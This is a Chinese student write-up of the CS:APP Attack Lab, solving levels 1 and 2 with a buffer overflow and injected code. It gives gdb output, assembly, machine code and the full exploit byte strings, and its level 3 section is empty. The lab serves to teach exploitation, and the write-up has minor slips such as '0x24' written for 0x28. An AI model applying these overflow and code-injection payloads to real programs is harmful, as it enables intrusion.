lab之前先阅读了该lab的文档 非常关键  
http://csapp.cs.cmu.edu/3e/attacklab.pdf  
Both CTARGET and RTARGET read strings from standard input. They do so with the function getbuf  
defined below:  
```c
unsigned getbuf()
{
char buf[BUFFER_SIZE];
Gets(buf);
return 1;
}
```

正式开始之前先用命令 lscpu | grep -i byte 查看机器是大端还是小端 这会影响输入的顺序  
Byte Order:            Little Endian  
显示为小端机器 则地址顺序相比正常写法需要改变   
如地址0x123456 需要写为 56 34 12  
再将ctarget gtarget用objdump转换成汇编代码以便了解函数地址  

### ***CI level1***
汇编代码中 函数touch1 在地址0x4017c0  
且getbuf有 rsp-0x28 即40bytes  
于是在输入的第40字节后添加地址 4017c0 以替换栈中的ret值  
答案如下  
输入:  00 00 ... 00 c0 17 40  
位数:   0  1 ... 40 41 42 43  

### ***CI level2***
与上题不同 level2 需要编写一个函数将给定的cookie值带入指定的函数   
若直接在返回插入函数地址 加上栈随机化 很难找到正确的函数入口 此时需要利用栈指针直接转跳   
利用栈指针 先找到栈指针位置
Starting program: ctarget -q   
Cookie: 0x59b997fa   
Dump of assembler code for function getbuf:   
=> 0x00000000004017a8 <+0>:	  sub    $0x28,%rsp   
   0x00000000004017ac <+4>:	  mov    %rsp,%rdi   
   0x00000000004017af <+7>:	  callq  0x401a40 <Gets>   
   0x00000000004017b4 <+12>:	mov    $0x1,%eax   
   0x00000000004017b9 <+17>:	add    $0x28,%rsp   
   0x00000000004017bd <+21>:	retq      
End of assembler dump.   
(gdb) p/x $rsp   
$1 = 0x5561dca0   
(gdb) p/x 0x5561dca0-0x28   
$2 = 0x5561dc78   

获得%rsp位置此时还没运行该指令分配空间 需要减去0x24 得到运行后的栈地址0x5561dc78 同样需要转换成小端地址78 dc 61 55   
运行得到的 Cookie: 0x59b997fa    
再查看ctarget的汇编代码 得知touch2的起始地址为 4017ec 即可开始写注入所需的函数   
File\:phase.s   
```assembly
pushq $0x4017ec
movq $0x59b997fa,%rdi
retq
```
使用gcc -c选项编译该文件   
再利用objdump 反编译成机器码得到   
68 ec 17 40 00       	pushq  $0x4017ec   
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi   
c3                   	retq      

则答案为
68 ec 17 40 00 48 c7 c7 fa 97 
b9 59 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
78 dc 61 55   

### ***CI level3***

